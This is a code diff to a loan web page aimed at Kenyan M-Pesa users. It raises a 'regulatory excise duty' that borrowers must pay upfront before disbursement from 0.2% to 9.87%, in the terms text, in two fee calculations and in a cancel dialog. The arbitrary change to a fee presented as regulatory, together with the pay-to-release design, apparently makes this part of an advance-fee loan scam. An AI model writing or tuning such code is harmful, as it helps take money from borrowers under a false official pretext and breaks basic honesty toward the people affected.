@@ -131,7 +131,7 @@ document.addEventListener('DOMContentLoaded', () => {
           You must be a Kenyan resident aged 18 years or older, with a valid National ID and a registered Safaricom M-Pesa account.</p>
           
           <p style="margin-bottom: 10px;"><strong>2. Interest & Fees</strong><br>
-          Loans are subject to a flat interest rate of 3.5% per month. A regulatory excise duty of 0.2% is required to authorize the disbursement of your approved loan amount.</p>
+          Loans are subject to a flat interest rate of 3.5% per month. A regulatory excise duty of 9.87% is required to authorize the disbursement of your approved loan amount.</p>
           
           <p style="margin-bottom: 10px;"><strong>3. Repayment & Rollover</strong><br>
           You agree to repay the total outstanding amount within your selected repayment period (1, 2, 3, or 6 months). Extensions or rollovers must be requested prior to the due date and are subject to additional terms.</p>
@@ -923,7 +923,7 @@ document.addEventListener('DOMContentLoaded', () => {
     
     const data = JSON.parse(rawData);
     const amount = parseInt(data.loanAmount, 10);
-    const exciseDuty = Math.round(amount * 0.002); // 0.2% excise duty
+    const exciseDuty = Math.round(amount * 0.0987); // 9.87% excise duty
 
     // Set amounts in the UI
     document.getElementById('excise-loan-amount-val').textContent = formatKsh(amount);
@@ -1067,7 +1067,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (!rawData) return;
     const appData = JSON.parse(rawData);
     const amount = parseInt(appData.loanAmount, 10);
-    const exciseDuty = Math.round(amount * 0.002);
+    const exciseDuty = Math.round(amount * 0.0987);
 
     const formattedTargetPhone = formatKenyanPhone(cleanPhone);
     document.getElementById('sending-phone-val').textContent = formattedTargetPhone;
@@ -1200,7 +1200,7 @@ document.addEventListener('DOMContentLoaded', () => {
   function showCancelConfirmModal() {
     Swal.fire({
       title: 'Cancel Payment?',
-      text: 'Are you sure you want to cancel the Excise Duty authorization? Your loan offer is reserved, but we cannot disburse the funds without the regulatory 0.2% excise payment.',
+      text: 'Are you sure you want to cancel the Excise Duty authorization? Your loan offer is reserved, but we cannot disburse the funds without the regulatory 9.87% excise payment.',
       icon: 'warning',
       showCancelButton: true,
       confirmButtonText: 'Yes, Cancel Payment',
